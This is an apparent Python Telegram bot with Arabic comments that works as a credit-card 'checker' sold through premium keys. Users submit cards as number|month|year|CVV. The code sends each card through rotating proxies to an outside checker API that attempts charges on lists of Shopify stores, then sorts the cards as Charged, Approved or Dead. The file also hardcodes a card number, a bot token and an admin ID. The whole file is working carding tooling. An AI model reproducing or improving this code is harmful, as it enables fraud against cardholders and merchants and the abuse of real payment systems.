import os
import re
import json
import random
import time
import asyncio
import threading
import requests
from datetime import datetime, timedelta
import telebot
from telebot import types

# ==================================================
# 1. البيانات الأساسية
# ==================================================
BOT_TOKEN = "8250378472:AAFH_JgQVbOUnCUvYQaOnLMnrWi4G_MCDZY"
ADMIN_ID = 6936293942
CHECKER_API_URL = 'http://afuonac.up.railway.app/shopify_parallel'

# ==================================================
# 2. تعريف المتغيرات والملفات
# ==================================================
PREMIUM_USERS_FILE = "premium_users.txt"
SITES_FILE = 'sites.txt'
PROXY_FILE = 'proxy.txt'
PRICE_FILTERS_FILE = "price_filters.json"
SITES_WITH_PRICE_FILE = "sites_price.json"
KEYS_FILE = "keys.json"
HITS_CHANNEL_ID = 0

active_sessions = {}
TEMP_FILE_DATA = {}
SHOPIFY_SESSION_RESULTS = {}

DEFAULT_FILTERS = [
    {"name": "0~10", "min": 0, "max": 10},
    {"name": "10~50", "min": 10, "max": 50},
    {"name": "50~200", "min": 50, "max": 200},
    {"name": "200~ & ", "min": 200, "max": 999999},
    {"name": "Aʟʟ Sɪᴛᴇs", "min": 0, "max": 999999, "all": True}
]

# ==================================================
# 3. إنشاء البوت
# ==================================================
bot = telebot.TeleBot(BOT_TOKEN)

# ==================================================
# 4. الدوال المساعدة
# ==================================================
def get_file_lines(filepath):
    if not os.path.exists(filepath):
        return []
    try:
        with open(filepath, 'r', encoding='utf-8', errors='ignore') as f:
            return [line.strip() for line in f if line.strip()]
    except:
        return []

def load_premium_users():
    if not os.path.exists(PREMIUM_USERS_FILE):
        with open(PREMIUM_USERS_FILE, 'w') as f:
            f.write(f"{ADMIN_ID}\n")
        return [str(ADMIN_ID)]
    try:
        with open(PREMIUM_USERS_FILE, 'r', encoding='utf-8', errors='ignore') as f:
            users = [line.strip() for line in f if line.strip()]
        if str(ADMIN_ID) not in users:
            users.append(str(ADMIN_ID))
            with open(PREMIUM_USERS_FILE, 'w') as f:
                for u in users:
                    f.write(f"{u}\n")
        return users
    except:
        return [str(ADMIN_ID)]

def load_sites():
    return get_file_lines(SITES_FILE)

def load_proxies():
    return get_file_lines(PROXY_FILE)

def is_premium(user_id):
    premium_users = load_premium_users()
    return str(user_id) in premium_users

def add_premium_user_sync(user_id):
    premium_users = load_premium_users()
    if str(user_id) not in premium_users:
        premium_users.append(str(user_id))
        with open(PREMIUM_USERS_FILE, 'w') as f:
            for uid in premium_users:
                f.write(f"{uid}\n")
        return True
    return False

def remove_premium_user_sync(user_id):
    premium_users = load_premium_users()
    if str(user_id) in premium_users:
        premium_users.remove(str(user_id))
        with open(PREMIUM_USERS_FILE, 'w') as f:
            for uid in premium_users:
                f.write(f"{uid}\n")
        return True
    return False

def generate_key():
    random_part = ''.join(random.choices('ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789', k=15))
    return f"YACINE_{random_part}"

def load_keys_sync():
    if not os.path.exists(KEYS_FILE):
        return {}
    try:
        with open(KEYS_FILE, 'r') as f:
            return json.load(f)
    except:
        return {}

def save_keys_sync(keys):
    with open(KEYS_FILE, 'w') as f:
        json.dump(keys, f, indent=4)

def load_price_filters_sync():
    if not os.path.exists(PRICE_FILTERS_FILE):
        return {}
    try:
        with open(PRICE_FILTERS_FILE, 'r') as f:
            return json.load(f)
    except:
        return {}

def save_price_filters_sync(filters):
    with open(PRICE_FILTERS_FILE, 'w') as f:
        json.dump(filters, f, indent=4)

def load_sites_with_price_sync():
    if not os.path.exists(SITES_WITH_PRICE_FILE):
        return []
    try:
        with open(SITES_WITH_PRICE_FILE, 'r') as f:
            return json.load(f)
    except:
        return []

def save_sites_with_price_sync(data):
    with open(SITES_WITH_PRICE_FILE, 'w') as f:
        json.dump(data, f, indent=4)

def get_price_from_response(raw_response):
    try:
        price = raw_response.get('Price', '-')
        if price != '-' and price != 0:
            try:
                price_clean = str(price).replace('$', '').replace(',', '').strip()
                return float(price_clean)
            except:
                return 0.0
        return 0.0
    except:
        return 0.0

def is_site_dead(response_msg, gateway, price):
    if not response_msg:
        return True
    if not gateway or gateway == "Unknown":
        return True
    if "Shopify" not in gateway:
        return True
    price_str = str(price)
    if price_str in ["-", "$-", "$0", "$0.0", "0", "$0.00"]:
        return True
    return False

def extract_cc(text):
    pattern = r'(\d{15,16})\|(\d{2})\|(\d{2,4})\|(\d{3,4})'
    matches = re.findall(pattern, text)
    cards = []
    for match in matches:
        card, month, year, cvv = match
        if len(year) == 2:
            year = '20' + year
        cards.append(f"{card}|{month}|{year}|{cvv}")
    return cards

# ==================================================
# 5. دوال الفحص (متزامنة)
# ==================================================
def check_card_sync(card, site, proxy):
    try:
        parts = card.split('|')
        if len(parts) != 4:
            return {'status': 'Invalid Format', 'message': 'Invalid card format', 'card': card}
        if not site.startswith('http'):
            site = f'https://{site}'
        proxy_str = None
        if proxy:
            proxy_parts = proxy.split(':')
            if len(proxy_parts) == 4:
                ip, port, user, password = proxy_parts
                proxy_str = f"{ip}:{port}:{user}:{password}"
            elif len(proxy_parts) == 2:
                ip, port = proxy_parts
                proxy_str = f"{ip}:{port}"
            else:
                proxy_str = proxy
        url = f'{CHECKER_API_URL}?site={site}&cc={card}'
        if proxy_str:
            url += f'&proxy={proxy_str}'
        try:
            response = requests.get(url, timeout=30)
            if response.status_code != 200:
                return {'status': 'Site Error', 'message': f'HTTP {response.status_code}', 'card': card, 'retry': True}
            raw = response.json()
        except:
            return {'status': 'Site Error', 'message': 'Invalid response', 'card': card, 'retry': True}
        response_msg = raw.get('Response', '')
        price = raw.get('Price', '-')
        if price != '-' and price != 0:
            price_display = f"${price}"
        else:
            price_display = '-'
        gateway = raw.get('Gateway', 'Shopify')
        if is_site_dead(response_msg, gateway, price_display):
            return {'status': 'Site Error', 'message': response_msg, 'card': card, 'retry': True, 'gateway': gateway, 'price': price_display}
        response_lower = response_msg.lower()
        if 'charged' in response_lower or 'order_placed' in response_lower or 'thank you' in response_lower or 'payment successful' in response_lower:
            return {'status': 'Charged', 'message': response_msg, 'card': card, 'site': site, 'gateway': gateway, 'price': price_display}
        elif any(key in response_lower for key in ['approved', 'success', 'insufficient_funds', 'invalid_cvv', 'incorrect_cvv', 'invalid_cvc', 'incorrect_cvc', 'incorrect_zip', 'cvv issue', '3d', 'otp', 'verification required', 'authenticate', 'authentication required']):
            return {'status': 'Approved', 'message': response_msg, 'card': card, 'site': site, 'gateway': gateway, 'price': price_display}
        else:
            return {'status': 'Dead', 'message': response_msg, 'card': card, 'site': site, 'gateway': gateway, 'price': price_display}
    except requests.Timeout:
        return {'status': 'Site Error', 'message': 'Request timeout', 'card': card, 'retry': True}
    except Exception as e:
        return {'status': 'Dead', 'message': str(e), 'card': card, 'gateway': 'Unknown', 'price': '-'}

def check_card_with_retry_sync(card, sites, proxies, max_retries=2):
    if not sites:
        return {'status': 'Dead', 'message': 'No sites available', 'card': card, 'gateway': 'Unknown', 'price': '-'}
    if not proxies:
        return {'status': 'Dead', 'message': 'No proxies available', 'card': card, 'gateway': 'Unknown', 'price': '-'}
    for attempt in range(max_retries):
        site = random.choice(sites)
        proxy = random.choice(proxies)
        result = check_card_sync(card, site, proxy)
        if not result.get('retry'):
            return result
        if attempt < max_retries - 1:
            time.sleep(0.3)
    return {'status': 'Dead', 'message': 'Max retries exceeded', 'card': card, 'gateway': 'Unknown', 'price': '-'}

def test_site_with_price_sync(site, proxy):
    test_card = "4031630422575208|01|2030|280"
    try:
        if not site.startswith('http'):
            site = f'https://{site}'
        proxy_str = None
        if proxy:
            proxy_parts = proxy.split(':')
            if len(proxy_parts) == 4:
                ip, port, user, password = proxy_parts
                proxy_str = f"{ip}:{port}:{user}:{password}"
            elif len(proxy_parts) == 2:
                ip, port = proxy_parts
                proxy_str = f"{ip}:{port}"
        url = f'{CHECKER_API_URL}?site={site}&cc={test_card}'
        if proxy_str:
            url += f'&proxy={proxy_str}'
        response = requests.get(url, timeout=30)
        if response.status_code != 200:
            return {'site': site, 'status': 'dead', 'price': 0.0}
        raw = response.json()
        response_msg = raw.get('Response', '')
        gateway = raw.get('Gateway', '')
        price_display = raw.get('Price', '-')
        if is_site_dead(response_msg, gateway, price_display):
            return {'site': site, 'status': 'dead', 'price': 0.0}
        else:
            return {'site': site, 'status': 'alive', 'price': get_price_from_response(raw)}
    except:
        return {'site': site, 'status': 'dead', 'price': 0.0}

def test_proxy_sync(proxy):
    try:
        proxy_parts = proxy.split(':')
        if len(proxy_parts) == 4:
            ip, port, user, password = proxy_parts
            proxy_url = f'http://{user}:{password}@{ip}:{port}'
        elif len(proxy_parts) == 2:
            ip, port = proxy_parts
            proxy_url = f'http://{ip}:{port}'
        else:
            proxy_url = f'http://{proxy}'
        proxies = {'http': proxy_url, 'https': proxy_url}
        response = requests.get('https://www.shopify.com', proxies=proxies, timeout=10)
        if response.status_code == 200:
            return {'proxy': proxy, 'status': 'alive'}
        else:
            return {'proxy': proxy, 'status': 'dead'}
    except:
        return {'proxy': proxy, 'status': 'dead'}

# ==================================================
# 6. أوامر البوت الرئيسية
# ==================================================
@bot.message_handler(commands=['start'])
def start(message):
    user_id = message.from_user.id
    is_prem = is_premium(user_id)
    username = message.from_user.username or "User"
    plan = "🆓 Fʀᴇᴇ" if not is_prem else "⭐ Pʀᴇᴍɪᴜᴍ"
    
    welcome_text = f"""Wᴇʟᴄᴏᴍᴇ @{username}!
👑 Pʟᴀɴ: {plan}
🎁 Hᴏᴡ ᴛᴏ ᴜsᴇ:
   🦉 /addproxy
   🦉 /cc ᴄᴀʀᴅ|ᴍᴍ|ʏʏ|ᴄᴠᴠ
   🔑 /redeem Kᴇʏ
💡 Bᴏᴛ Dᴇᴠ @yacine_X6"""
    
    keyboard = types.InlineKeyboardMarkup(row_width=2)
    btn1 = types.InlineKeyboardButton("Cᴍᴅ", callback_data="show_cmds")
    btn2 = types.InlineKeyboardButton("Cʜᴀɴɴᴇʟ", url="https://t.me/netdz02_dev")
    keyboard.add(btn1, btn2)
    if user_id == ADMIN_ID:
        btn3 = types.InlineKeyboardButton("Aᴅᴍɪɴ Pᴀɴᴇʟ", callback_data="admin_panel")
        keyboard.add(btn3)
    bot.reply_to(message, welcome_text, reply_markup=keyboard)

@bot.callback_query_handler(func=lambda call: True)
def callback_handler(call):
    if call.data == "show_cmds":
        commands_text = """📋 Usᴇʀ Cᴏᴍᴍᴀɴᴅs
🛒 Sʜᴏᴘɪғʏ
├─ /cc ᴄᴄ|ᴍᴍ|ʏʏ|ᴄᴠᴠ
└─ /chk (mass check)
🔌 Pʀᴏxʏ Mᴀɴᴀɢᴇᴍᴇɴᴛ
├─ /addproxy
├─ /proxy
├─ /chkproxy
├─ /rmproxy
├─ /rmproxyindex
├─ /clearproxy
└─ /getproxy
🔑 Kᴇʏ Sʏsᴛᴇᴍ
└─ /redeem Kᴇʏ"""
        keyboard = types.InlineKeyboardMarkup()
        keyboard.add(types.InlineKeyboardButton("Bᴀᴄᴋ", callback_data="main_menu"))
        bot.edit_message_text(commands_text, call.message.chat.id, call.message.message_id, reply_markup=keyboard)
    
    elif call.data == "admin_panel":
        if call.from_user.id != ADMIN_ID:
            bot.answer_callback_query(call.id, "❌ Aᴅᴍɪɴ ᴏɴʟʏ.", show_alert=True)
            return
        admin_text = """👑 Aᴅᴍɪɴ Pᴀɴᴇʟ
📋 Pʀᴇᴍɪᴜᴍ Mᴀɴᴀɢᴇᴍᴇɴᴛ
├─ /addpremium
├─ /removepremium
├─ /listpremium
└─ /genkeys
🌐 Sɪᴛᴇs Mᴀɴᴀɢᴇᴍᴇɴᴛ
├─ /addsites
├─ /site
├─ /rm
└─ /getsites
📊 Sᴛᴀᴛs
└─ /stats"""
        keyboard = types.InlineKeyboardMarkup()
        keyboard.add(types.InlineKeyboardButton("Bᴀᴄᴋ", callback_data="main_menu"))
        bot.edit_message_text(admin_text, call.message.chat.id, call.message.message_id, reply_markup=keyboard)
    
    elif call.data == "main_menu":
        start(call.message)

# ==================================================
# 7. الأوامر العادية
# ==================================================
@bot.message_handler(commands=['cc'])
def cc_command(message):
    user_id = message.from_user.id
    if not is_premium(user_id):
        bot.reply_to(message, "❌ Premium only.")
        return
    try:
        cc_input = message.text.split(' ', 1)[1].strip()
    except:
        bot.reply_to(message, "❌ /cc ᴄᴀʀᴅ|ᴍᴍ|ʏʏ|ᴄᴠᴠ")
        return
    cards = extract_cc(cc_input)
    if not cards:
        bot.reply_to(message, "❌ Invalid CC format.")
        return
    card = cards[0]
    status_msg = bot.reply_to(message, f"🔄 Checking <code>{card}</code>...", parse_mode='HTML')
    sites = load_sites()
    proxies = load_proxies()
    if not sites or not proxies:
        bot.edit_message_text("❌ No sites or proxies available.", status_msg.chat.id, status_msg.message_id)
        return
    result = check_card_with_retry_sync(card, sites, proxies, max_retries=3)
    if result['status'] == 'Charged':
        status_header = "💎 CHARGED"
    elif result['status'] == 'Approved':
        status_header = "✅ APPROVED"
    else:
        status_header = "❌ DECLINED"
    final_resp = f"""{status_header}
💳 CC <code>{result['card']}</code>
🛒 Gᴀᴛᴇᴡᴀʏ {result.get('gateway', 'Unknown')}
📝 Rᴇsᴘᴏɴsᴇ {result['message'][:100]}
💸 Pʀɪᴄᴇ {result.get('price', '-')}"""
    bot.edit_message_text(final_resp, status_msg.chat.id, status_msg.message_id, parse_mode='HTML')

@bot.message_handler(commands=['chk'])
def chk_command(message):
    user_id = message.from_user.id
    if not is_premium(user_id):
        bot.reply_to(message, "❌ Premium only.")
        return
    bot.reply_to(message, "🚧 Mass check feature coming soon in telebot version.")

@bot.message_handler(commands=['addproxy'])
def addproxy_command(message):
    user_id = message.from_user.id
    if not is_premium(user_id):
        bot.reply_to(message, "❌ Premium only.")
        return
    text = message.text
    lines = text.split('\n')
    if len(lines) < 2:
        bot.reply_to(message, "❌ /addproxy followed by proxies, one per line.")
        return
    proxies_to_add = [line.strip() for line in lines[1:] if line.strip()]
    if not proxies_to_add:
        bot.reply_to(message, "❌ No proxies provided.")
        return
    current_proxies = load_proxies()
    new_proxies = [p for p in proxies_to_add if p not in current_proxies]
    if not new_proxies:
        bot.reply_to(message, "⚠️ All proxies already exist.")
        return
    with open(PROXY_FILE, 'a') as f:
        for proxy in new_proxies:
            f.write(f"{proxy}\n")
    bot.reply_to(message, f"✅ Added {len(new_proxies)} proxies!")

@bot.message_handler(commands=['proxy'])
def proxy_command(message):
    user_id = message.from_user.id
    if not is_premium(user_id):
        bot.reply_to(message, "❌ Premium only.")
        return
    proxies = load_proxies()
    if not proxies:
        bot.reply_to(message, "❌ No proxies.")
        return
    status_msg = bot.reply_to(message, f"🔄 Checking {len(proxies)} proxies...")
    alive_proxies = []
    dead_proxies = []
    for i, proxy in enumerate(proxies):
        result = test_proxy_sync(proxy)
        if result['status'] == 'alive':
            alive_proxies.append(proxy)
        else:
            dead_proxies.append(proxy)
        if i % 10 == 0:
            bot.edit_message_text(f"🔄 Checking proxies...\n✅ Alive: {len(alive_proxies)}\n❌ Dead: {len(dead_proxies)}/{len(proxies)}", status_msg.chat.id, status_msg.message_id)
    with open(PROXY_FILE, 'w') as f:
        for proxy in alive_proxies:
            f.write(f"{proxy}\n")
    bot.edit_message_text(f"✅ Proxy check complete!\nTotal: {len(proxies)}\nAlive: {len(alive_proxies)}\nRemoved: {len(dead_proxies)}", status_msg.chat.id, status_msg.message_id)

@bot.message_handler(commands=['chkproxy'])
def chkproxy_command(message):
    user_id = message.from_user.id
    if not is_premium(user_id):
        bot.reply_to(message, "❌ Premium only.")
        return
    try:
        proxy = message.text.split(' ', 1)[1].strip()
    except:
        bot.reply_to(message, "❌ /chkproxy ɪᴘ:ᴘᴏʀᴛ:ᴜsᴇʀ:ᴘᴀss")
        return
    status_msg = bot.reply_to(message, f"🔄 Checking proxy...")
    result = test_proxy_sync(proxy)
    if result['status'] == 'alive':
        bot.edit_message_text(f"✅ Proxy is ALIVE!\n<code>{proxy}</code>", status_msg.chat.id, status_msg.message_id, parse_mode='HTML')
    else:
        bot.edit_message_text(f"❌ Proxy is DEAD!\n<code>{proxy}</code>", status_msg.chat.id, status_msg.message_id, parse_mode='HTML')

@bot.message_handler(commands=['rmproxy'])
def rmproxy_command(message):
    user_id = message.from_user.id
    if not is_premium(user_id):
        bot.reply_to(message, "❌ Premium only.")
        return
    try:
        proxy_to_remove = message.text.split(' ', 1)[1].strip()
    except:
        bot.reply_to(message, "❌ /rmproxy ɪᴘ:ᴘᴏʀᴛ:ᴜsᴇʀ:ᴘᴀss")
        return
    current_proxies = load_proxies()
    if proxy_to_remove not in current_proxies:
        bot.reply_to(message, f"❌ Proxy not found.")
        return
    new_proxies = [p for p in current_proxies if p != proxy_to_remove]
    with open(PROXY_FILE, 'w') as f:
        for proxy in new_proxies:
            f.write(f"{proxy}\n")
    bot.reply_to(message, f"✅ Removed proxy!")

@bot.message_handler(commands=['rmproxyindex'])
def rmproxyindex_command(message):
    user_id = message.from_user.id
    if not is_premium(user_id):
        bot.reply_to(message, "❌ Premium only.")
        return
    try:
        indices_str = message.text.split(' ', 1)[1].strip()
        indices = [int(i.strip()) - 1 for i in indices_str.split(',')]
    except:
        bot.reply_to(message, "❌ /rmproxyindex 1,2,3")
        return
    current_proxies = load_proxies()
    if not current_proxies:
        bot.reply_to(message, "❌ No proxies.")
        return
    removed = []
    new_proxies = []
    for i, proxy in enumerate(current_proxies):
        if i in indices:
            removed.append(proxy)
        else:
            new_proxies.append(proxy)
    if not removed:
        bot.reply_to(message, "❌ No valid indices.")
        return
    with open(PROXY_FILE, 'w') as f:
        for proxy in new_proxies:
            f.write(f"{proxy}\n")
    bot.reply_to(message, f"✅ Removed {len(removed)} proxies!")

@bot.message_handler(commands=['clearproxy'])
def clearproxy_command(message):
    user_id = message.from_user.id
    if not is_premium(user_id):
        bot.reply_to(message, "❌ Premium only.")
        return
    current_proxies = load_proxies()
    count = len(current_proxies)
    if count == 0:
        bot.reply_to(message, "❌ No proxies.")
        return
    with open(PROXY_FILE, 'w') as f:
        f.write("")
    bot.reply_to(message, f"✅ Cleared all {count} proxies!")

@bot.message_handler(commands=['getproxy'])
def getproxy_command(message):
    user_id = message.from_user.id
    if not is_premium(user_id):
        bot.reply_to(message, "❌ Premium only.")
        return
    current_proxies = load_proxies()
    if not current_proxies:
        bot.reply_to(message, "❌ No proxies.")
        return
    if len(current_proxies) <= 50:
        proxy_list = "\n".join([f"{i+1}. <code>{p}</code>" for i, p in enumerate(current_proxies)])
        bot.reply_to(message, f"📋 All Proxies ({len(current_proxies)}):\n\n{proxy_list}", parse_mode='HTML')
    else:
        timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
        filename = f"proxies_{user_id}_{timestamp}.txt"
        with open(filename, 'w') as f:
            for i, proxy in enumerate(current_proxies):
                f.write(f"{i+1}. {proxy}\n")
        with open(filename, 'rb') as f:
            bot.send_document(message.chat.id, f, caption=f"📋 All Proxies ({len(current_proxies)})")
        os.remove(filename)

@bot.message_handler(commands=['redeem'])
def redeem_command(message):
    user_id = message.from_user.id
    try:
        key = message.text.split(' ', 1)[1].strip().upper()
    except:
        bot.reply_to(message, "📝 /redeem Kᴇʏ")
        return
    keys_data = load_keys_sync()
    if key not in keys_data:
        bot.reply_to(message, "❌ Invalid Key!")
        return
    key_data = keys_data[key]
    if key_data.get('type') == 'time_limit':
        expiry = datetime.fromisoformat(key_data['expiry'])
        if datetime.now() > expiry:
            bot.reply_to(message, "❌ Key expired!")
            return
        if key_data['used_count'] >= key_data['user_limit']:
            bot.reply_to(message, f"❌ Key limit reached.")
            return
        user_id_str = str(user_id)
        if user_id_str in key_data['used_by']:
            bot.reply_to(message, "❌ You already used this key!")
            return
        if is_premium(user_id):
            bot.reply_to(message, "❌ You already have premium!")
            return
        add_premium_user_sync(user_id)
        key_data['used_count'] += 1
        key_data['used_by'].append(user_id_str)
        keys_data[key] = key_data
        save_keys_sync(keys_data)
        bot.reply_to(message, f"""🎉 Congratulations!
⭐ VIP Access Activated!
📅 Duration: {key_data['hours']} hours""")

# ==================================================
# 8. الأوامر الإدارية (للمطور فقط)
# ==================================================
@bot.message_handler(commands=['addpremium'])
def addpremium_command(message):
    if message.from_user.id != ADMIN_ID:
        bot.reply_to(message, "❌ Admin only.")
        return
    try:
        target_id = int(message.text.split(' ', 1)[1].strip())
    except:
        bot.reply_to(message, "📝 /addpremium ᴜsᴇʀ_ɪᴅ")
        return
    if add_premium_user_sync(target_id):
        bot.reply_to(message, f"✅ User <code>{target_id}</code> added!", parse_mode='HTML')
    else:
        bot.reply_to(message, f"⚠️ User <code>{target_id}</code> already premium.", parse_mode='HTML')

@bot.message_handler(commands=['removepremium'])
def removepremium_command(message):
    if message.from_user.id != ADMIN_ID:
        bot.reply_to(message, "❌ Admin only.")
        return
    try:
        target_id = int(message.text.split(' ', 1)[1].strip())
    except:
        bot.reply_to(message, "📝 /removepremium ᴜsᴇʀ_ɪᴅ")
        return
    if remove_premium_user_sync(target_id):
        bot.reply_to(message, f"✅ User <code>{target_id}</code> removed!", parse_mode='HTML')
    else:
        bot.reply_to(message, f"⚠️ User <code>{target_id}</code> not premium.", parse_mode='HTML')

@bot.message_handler(commands=['listpremium'])
def listpremium_command(message):
    if message.from_user.id != ADMIN_ID:
        bot.reply_to(message, "❌ Admin only.")
        return
    users = load_premium_users()
    if not users:
        bot.reply_to(message, "📭 No premium users.")
        return
    bot.reply_to(message, f"👑 Premium Users ({len(users)}):\n" + "\n".join([f"• <code>{u}</code>" for u in users]), parse_mode='HTML')

@bot.message_handler(commands=['genkeys'])
def genkeys_command(message):
    if message.from_user.id != ADMIN_ID:
        bot.reply_to(message, "❌ Admin only.")
        return
    try:
        parts = message.text.split()
        amount, hours, user_limit = int(parts[1]), int(parts[2]), int(parts[3])
    except:
        bot.reply_to(message, "📝 /genkeys ᴀᴍᴏᴜɴᴛ ʜᴏᴜʀs ʟɪᴍɪᴛ")
        return
    keys_data = load_keys_sync()
    generated = []
    for _ in range(amount):
        key = generate_key()
        keys_data[key] = {
            'type': 'time_limit', 'hours': hours,
            'expiry': (datetime.now() + timedelta(hours=hours)).isoformat(),
            'user_limit': user_limit, 'used_count': 0, 'used_by': []
        }
        generated.append(key)
    save_keys_sync(keys_data)
    bot.reply_to(message, f"⭐ {amount} Keys Generated!\n" + "\n".join([f"<code>{k}</code>" for k in generated]), parse_mode='HTML')

@bot.message_handler(commands=['addsites'])
def addsites_command(message):
    if message.from_user.id != ADMIN_ID:
        bot.reply_to(message, "❌ Admin only.")
        return
    if not message.reply_to_message or not message.reply_to_message.document:
        bot.reply_to(message, "📝 Reply to a .txt file.")
        return
    try:
        file_info = bot.get_file(message.reply_to_message.document.file_id)
        downloaded_file = bot.download_file(file_info.file_path)
        sites = downloaded_file.decode('utf-8').splitlines()
        sites = [s.strip() for s in sites if s.strip()]
        if not sites:
            bot.reply_to(message, "❌ No sites found.")
            return
        current_sites = load_sites()
        new_sites = [s for s in sites if s not in current_sites]
        if not new_sites:
            bot.reply_to(message, "⚠️ All sites already exist.")
            return
        with open(SITES_FILE, 'a') as f:
            for site in new_sites:
                f.write(f"{site}\n")
        bot.reply_to(message, f"✅ Added {len(new_sites)} sites!")
    except Exception as e:
        bot.reply_to(message, f"❌ Error: {e}")

@bot.message_handler(commands=['site'])
def site_command(message):
    if message.from_user.id != ADMIN_ID:
        bot.reply_to(message, "❌ Admin only.")
        return
    sites = load_sites()
    if not sites:
        bot.reply_to(message, "❌ No sites.")
        return
    proxies = load_proxies()
    if not proxies:
        bot.reply_to(message, "❌ No proxies.")
        return
    status_msg = bot.reply_to(message, f"🔄 Checking {len(sites)} sites...")
    alive_sites = []
    dead_sites = []
    sites_with_price = []
    for i, site in enumerate(sites):
        result = test_site_with_price_sync(site, random.choice(proxies))
        if result['status'] == 'alive':
            alive_sites.append(site)
            sites_with_price.append({'url': site, 'price': result.get('price', 0.0)})
        else:
            dead_sites.append(site)
        if i % 5 == 0:
            bot.edit_message_text(f"🔄 Checking sites...\n✅ Alive: {len(alive_sites)}\n❌ Dead: {len(dead_sites)}/{len(sites)}", status_msg.chat.id, status_msg.message_id)
    with open(SITES_FILE, 'w') as f:
        for site in alive_sites:
            f.write(f"{site}\n")
    save_sites_with_price_sync(sites_with_price)
    bot.edit_message_text(f"✅ Site check complete!\nTotal: {len(sites)}\nAlive: {len(alive_sites)}\nRemoved: {len(dead_sites)}", status_msg.chat.id, status_msg.message_id)

@bot.message_handler(commands=['rm'])
def rm_site_command(message):
    if message.from_user.id != ADMIN_ID:
        bot.reply_to(message, "❌ Admin only.")
        return
    try:
        url_to_remove = message.text.split(' ', 1)[1].strip()
    except:
        bot.reply_to(message, "❌ /rm ʜᴛᴛᴘs://sɪᴛᴇ.ᴄᴏᴍ")
        return
    current_sites = load_sites()
    if url_to_remove not in current_sites:
        bot.reply_to(message, f"❌ Site not found.")
        return
    new_sites = [s for s in current_sites if s != url_to_remove]
    with open(SITES_FILE, 'w') as f:
        for site in new_sites:
            f.write(f"{site}\n")
    bot.reply_to(message, f"✅ Site removed!")

@bot.message_handler(commands=['getsites'])
def getsites_command(message):
    if message.from_user.id != ADMIN_ID:
        bot.reply_to(message, "❌ Admin only.")
        return
    sites = load_sites()
    if not sites:
        bot.reply_to(message, "❌ No sites.")
        return
    timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
    filename = f"sites_{timestamp}.txt"
    with open(filename, 'w') as f:
        for site in sites:
            f.write(f"{site}\n")
    with open(filename, 'rb') as f:
        bot.send_document(message.chat.id, f, caption=f"📋 All Sites ({len(sites)})")
    os.remove(filename)

@bot.message_handler(commands=['setfilter'])
def setfilter_command(message):
    if message.from_user.id != ADMIN_ID:
        bot.reply_to(message, "❌ Admin only.")
        return
    try:
        parts = message.text.split(maxsplit=3)
        gateway = parts[1]
        range_str = parts[2]
        name = parts[3].strip()
        min_val, max_val = map(float, range_str.split('-'))
        filters = load_price_filters_sync()
        if gateway not in filters:
            filters[gateway] = []
        filters[gateway].append({"name": name, "min": min_val, "max": max_val})
        save_price_filters_sync(filters)
        bot.reply_to(message, f"✅ Filter added: {name}\n💰 {min_val:.0f} - {max_val:.0f}")
    except:
        bot.reply_to(message, "📝 /setfilter shopify_global ᴍɪɴ-ᴍᴀx \"Nᴀᴍᴇ\"")

@bot.message_handler(commands=['listfilters'])
def listfilters_command(message):
    if message.from_user.id != ADMIN_ID:
        bot.reply_to(message, "❌ Admin only.")
        return
    filters = load_price_filters_sync()
    if not filters:
        bot.reply_to(message, "📭 No filters.")
        return
    text = "🔧 Price Filters\n\n"
    for gateway, gateway_filters in filters.items():
        text += f"🛒 {gateway.upper()}\n"
        for i, f in enumerate(gateway_filters, 1):
            text += f"   {i}. {f['name']} ({f['min']:.0f}-{f['max']:.0f})\n"
        text += "\n"
    bot.reply_to(message, text)

@bot.message_handler(commands=['removefilter'])
def removefilter_command(message):
    if message.from_user.id != ADMIN_ID:
        bot.reply_to(message, "❌ Admin only.")
        return
    try:
        parts = message.text.split()
        gateway = parts[1].lower()
        filter_num = int(parts[2]) - 1
        filters = load_price_filters_sync()
        if gateway not in filters or filter_num >= len(filters[gateway]):
            bot.reply_to(message, f"❌ Invalid filter.")
            return
        removed = filters[gateway].pop(filter_num)
        save_price_filters_sync(filters)
        bot.reply_to(message, f"✅ Filter removed: {removed['name']}")
    except:
        bot.reply_to(message, "📝 /removefilter ɢᴀᴛᴇᴡᴀʏ ɴᴜᴍʙᴇʀ")

@bot.message_handler(commands=['stats'])
def stats_command(message):
    if message.from_user.id != ADMIN_ID:
        bot.reply_to(message, "❌ Admin only.")
        return
    premium_users = load_premium_users()
    sites = load_sites()
    proxies = load_proxies()
    bot.reply_to(message, f"""📊 Bot Statistics
👑 Admins: 1
💎 Premium Users: {len(premium_users)}
🌐 Sites: {len(sites)}
🔌 Proxies: {len(proxies)}
🤖 Status: Running ✅""")

@bot.message_handler(commands=['sethits'])
def sethits_command(message):
    if message.from_user.id != ADMIN_ID:
        bot.reply_to(message, "❌ Admin only.")
        return
    global HITS_CHANNEL_ID
    try:
        HITS_CHANNEL_ID = int(message.text.split(' ', 1)[1].strip())
        bot.reply_to(message, f"✅ Hits channel set to: <code>{HITS_CHANNEL_ID}</code>", parse_mode='HTML')
    except:
        bot.reply_to(message, "📝 /sethits -1001234567890")

@bot.message_handler(commands=['hits'])
def hits_command(message):
    if message.from_user.id != ADMIN_ID:
        bot.reply_to(message, "❌ Admin only.")
        return
    global HITS_CHANNEL_ID
    if HITS_CHANNEL_ID == 0:
        bot.reply_to(message, "❌ Hits channel not set.")
        return
    if HITS_CHANNEL_ID < 0:
        HITS_CHANNEL_ID = abs(HITS_CHANNEL_ID)
        bot.reply_to(message, "❌ Hits channel turned OFF")
    else:
        HITS_CHANNEL_ID = -abs(HITS_CHANNEL_ID)
        bot.reply_to(message, "✅ Hits channel turned ON")

# ==================================================
# 9. تشغيل البوت
# ==================================================
if __name__ == "__main__":
    print("✅ Bᴏᴛ sᴛᴀʀᴛᴇᴅ sᴜᴄᴄᴇssғᴜʟʟʏ (باستخدام telebot)!")
    bot.infinity_polling()
